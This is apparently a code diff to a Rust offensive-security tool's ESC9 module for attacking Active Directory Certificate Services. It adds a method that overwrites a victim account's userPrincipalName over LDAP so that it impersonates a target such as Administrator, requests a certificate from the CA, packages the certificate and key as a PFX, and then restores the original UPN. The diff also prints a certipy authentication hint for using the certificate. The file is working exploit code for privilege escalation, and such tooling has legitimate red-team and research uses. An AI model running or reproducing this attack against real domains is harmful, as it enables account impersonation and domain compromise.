@@ -28,9 +28,11 @@
 //! should supply working LDAP credentials that have `GenericWrite` on the victim
 //! object.
 
+use crate::adcs::pfx::create_pfx;
 use crate::adcs::web_enrollment::WebEnrollmentClient;
 use crate::adcs::{IssuedCertificate, create_esc1_csr};
 use crate::error::{OverthroneError, Result};
+use crate::proto::ldap::LdapSession;
 use tracing::{info, warn};
 
 /// Constant — `CT_FLAG_NO_SECURITY_EXTENSION` as defined in MS-CRTD §2.2.2.7.7
@@ -51,6 +53,8 @@ pub struct Esc9Config {
     pub template: String,
     /// Account whose UPN we temporarily overwrite (must have GenericWrite rights)
     pub victim_account: String,
+    /// Distinguished Name of the victim account (required for live LDAP modification)
+    pub victim_dn: String,
     /// Current / original UPN of the victim account (saved for restoration)
     pub original_upn: String,
     /// Target UPN we want to impersonate (e.g. `Administrator@corp.local`)
@@ -132,6 +136,9 @@ impl Esc9Exploiter {
             );
         }
 
+        let pfx_data =
+            create_pfx(&cert_data, &private_key, None).unwrap_or_else(|_| cert_data.clone());
+
         let pkinit_hint = format!(
             "certipy auth -pfx {} -dc-ip <DC_IP> -domain {}",
             config.target_upn.replace('@', "_"),
@@ -140,7 +147,7 @@ impl Esc9Exploiter {
 
         Ok(Esc9Result {
             certificate: IssuedCertificate {
-                pfx_data: cert_data.clone(),
+                pfx_data,
                 thumbprint: Self::compute_thumbprint(&cert_data),
                 serial_number: Self::extract_serial(&cert_data).unwrap_or_default(),
                 valid_from: "Unknown".to_string(),
@@ -152,7 +159,7 @@ impl Esc9Exploiter {
                 signature_algorithm: "SHA256RSA".to_string(),
                 private_key_pem: private_key,
             },
-            upn_restored: false, // LDAP step is caller-responsibility
+            upn_restored: false, // LDAP step is caller-responsibility — use exploit_with_ldap()
             pkinit_hint,
         })
     }
@@ -200,6 +207,69 @@ impl Esc9Exploiter {
         parse_x509_certificate(der)
             .ok()
             .map(|(_, c)| c.raw_serial_as_string())
+    }
+
+    /// Perform the full ESC9 attack end-to-end with a live LDAP session.
+    ///
+    /// Unlike [`exploit`], this method:
+    /// 1. Sets `victim_dn`'s `userPrincipalName` to `target_upn` via LDAP.
+    /// 2. Requests the certificate from the CA web enrollment endpoint.
+    /// 3. Restores the original UPN via LDAP (even on error paths).
+    ///
+    /// Returns the issued certificate.  `Esc9Result::upn_restored` will be
+    /// `true` if the restoration write succeeded.
+    pub async fn exploit_with_ldap(
+        &self,
+        config: &Esc9Config,
+        ldap: &mut LdapSession,
+    ) -> Result<Esc9Result> {
+        if config.victim_dn.is_empty() {
+            return Err(OverthroneError::Adcs(
+                "ESC9: victim_dn must be set for live LDAP modification".to_string(),
+            ));
+        }
+
+        // Step 1 — poison the victim's UPN
+        info!(
+            "ESC9: Setting userPrincipalName of {} → {}",
+            config.victim_dn, config.target_upn
+        );
+        ldap.modify_replace(
+            &config.victim_dn,
+            "userPrincipalName",
+            config.target_upn.as_bytes(),
+        )
+        .await
+        .map_err(|e| OverthroneError::Adcs(format!("ESC9: UPN write failed: {e}")))?;
+
+        // Step 2 — request certificate (always attempt restoration afterwards)
+        let cert_result = self.exploit(config).await;
+
+        // Step 3 — restore the original UPN
+        info!(
+            "ESC9: Restoring userPrincipalName of {} → {}",
+            config.victim_dn, config.original_upn
+        );
+        let upn_restored = ldap
+            .modify_replace(
+                &config.victim_dn,
+                "userPrincipalName",
+                config.original_upn.as_bytes(),
+            )
+            .await
+            .is_ok();
+
+        if !upn_restored {
+            warn!(
+                "ESC9: Failed to restore UPN for {} — manual cleanup required",
+                config.victim_dn
+            );
+        }
+
+        // Propagate certificate error only after attempting UPN restoration
+        let mut result = cert_result?;
+        result.upn_restored = upn_restored;
+        Ok(result)
     }
 
     /// Generate LDAP command strings that the operator must execute to temporarily
@@ -257,6 +327,7 @@ mod tests {
         let config = Esc9Config {
             template: "UserTemplate".to_string(),
             victim_account: "victim".to_string(),
+            victim_dn: "CN=victim,CN=Users,DC=corp,DC=local".to_string(),
             original_upn: "victim@corp.local".to_string(),
             target_upn: "Administrator@corp.local".to_string(),
             ldap_url: "ldap://dc01.corp.local".to_string(),
